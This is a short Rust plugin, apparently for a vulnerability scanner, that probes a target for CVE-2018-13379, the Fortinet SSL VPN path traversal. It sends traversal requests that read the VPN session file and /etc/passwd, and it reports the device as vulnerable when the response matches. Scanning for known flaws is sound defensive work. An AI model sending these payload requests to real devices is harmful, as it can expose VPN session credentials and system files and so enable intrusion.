/* http-vuln-cve2018-13379-3 - CVE-2018-13379 Fortinet path traversal */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
        "/remote/fgt_lang?lang=/../../../../etc/passwd",
        "/remote/fgt_lang",
    ];
    let mut found = 0usize;
    for p in paths.iter() {
        let resp = match http_request(ctx, "GET", p, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        if contains_ci(http_body(&resp), "var fgt_lang") {
            append_out(ctx, &format!("{}{}",
                if found == 0 { "VULNERABLE: " } else { ", " }, p));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "not vulnerable: CVE-2018-13379 Fortinet path traversal");
    } else {
        append_out(ctx, " (CVE-2018-13379 Fortinet path traversal)");
    }
    0
}
